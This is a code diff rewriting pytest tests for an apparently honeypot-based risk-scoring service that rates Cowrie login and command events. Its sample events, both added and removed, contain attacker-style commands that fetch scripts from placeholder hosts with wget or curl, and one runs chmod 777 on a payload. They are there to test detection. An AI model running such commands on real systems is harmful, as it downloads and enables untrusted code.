@@ -1,65 +1,67 @@
-
 import pytest
-from sentinel.services.processor import calculate_risk_score
+from datetime import datetime, timezone
+from sentinel.core.services import _score_event
+from sentinel.config.settings import settings
 
-# Test cases for the calculate_risk_score function
-# Each tuple contains: (event_dict, expected_score, expected_factors)
-risk_score_test_cases = [
-    # Base case: a simple, non-malicious event
-    ({}, 10, ['Base Score']),
+@pytest.fixture
+def sample_event():
+    """Provides a sample raw event for testing."""
+    return {
+        "eventid": "cowrie.login.success",
+        "username": "root",
+        "src_ip": "1.2.3.4",
+        "geoip": {"country_name": "China"},
+        "input": "wget http://example.com/malware.sh"
+    }
 
-    # Successful login
-    ({'eventid': 'cowrie.login.success'}, 50, ['Base Score', 'Successful Login']),
-
-    # Root user login attempt
-    ({'username': 'root'}, 20, ['Base Score', 'Root User Attempt']),
-
-    # Common password usage (should decrease score)
-    ({'password': 'password'}, 5, ['Base Score', 'Common Password']),
-    
-    # Non-common password usage
-    ({'password': 'a-secure-password'}, 20, ['Base Score', 'Non-common Password']),
-
-    # Command execution
-    ({'eventid': 'cowrie.command.input'}, 35, ['Base Score', 'Command Executed']),
-
-    # Command with file download attempt (wget)
-    ({'eventid': 'cowrie.command.input', 'message': 'wget http://example.com/evil.sh'}, 65, ['Base Score', 'Command Executed', 'File Download Attempt']),
-
-    # Command with file download attempt (curl)
-    ({'eventid': 'cowrie.command.input', 'message': 'curl -O http://example.com/evil.sh'}, 65, ['Base Score', 'Command Executed', 'File Download Attempt']),
-
-    # High-risk combination: successful root login with a command
-    ({
-        'eventid': 'cowrie.login.success',
-        'username': 'root',
-        'message': 'some command' # message is not used for command executed score
-    }, 60, ['Base Score', 'Successful Login', 'Root User Attempt']),
-    
-    # Very high-risk: successful root login, non-common password, and wget
-    ({
-        'eventid': 'cowrie.command.input',
-        'username': 'root',
-        'password': 'a-secure-password',
-        'message': 'wget http://some.site/payload'
-    }, 85, ['Base Score', 'Root User Attempt', 'Non-common Password', 'Command Executed', 'File Download Attempt']),
-    
-    # Score capping at 100
-    ({
-        'eventid': 'cowrie.login.success',
-        'username': 'root',
-        'password': 'a-secure-password',
-        'message': 'wget http://some.site/payload'
-    }, 70, ['Base Score', 'Successful Login', 'Root User Attempt', 'Non-common Password']),
-]
-
-@pytest.mark.parametrize("event, expected_score, expected_factors", risk_score_test_cases)
-def test_calculate_risk_score(event, expected_score, expected_factors):
+def test_score_event_login_success(sample_event):
     """
-    Tests the calculate_risk_score function with various event payloads.
+    Tests that a successful root login from a high-risk country with a suspicious command
+    receives a high risk score.
     """
-    score, factors = calculate_risk_score(event)
-    assert score == expected_score
-    # Using set to ignore order of factors
-    assert set(factors) == set(expected_factors)
+    score, factors = _score_event(
+        event_type=sample_event["eventid"],
+        src=sample_event,
+        timestamp=datetime(2024, 1, 1, 23, 0, 0, tzinfo=timezone.utc)
+    )
+    
+    assert score > 80
+    assert "successful_login" in factors
+    assert "privileged_account" in factors
+    assert "geo_risk" in factors
+    assert "night_activity" in factors
 
+def test_score_event_failed_login():
+    """
+    Tests that a failed login receives a lower score than a successful one.
+    """
+    event = {
+        "eventid": "cowrie.login.failed",
+        "username": "user",
+        "src_ip": "5.6.7.8"
+    }
+    score, _ = _score_event(
+        event_type=event["eventid"],
+        src=event,
+        timestamp=datetime.now(timezone.utc)
+    )
+    
+    assert score < 20
+
+def test_score_event_suspicious_command():
+    """
+    Tests that a suspicious command significantly increases the risk score.
+    """
+    event = {
+        "eventid": "cowrie.command.input",
+        "input": "chmod 777 /tmp/payload",
+        "src_ip": "9.10.11.12"
+    }
+    score, factors = _score_event(
+        event_type=event["eventid"],
+        src=event,
+        timestamp=datetime.now(timezone.utc)
+    )
+    
+    assert score > 30
+    assert "suspicious_command" in factors
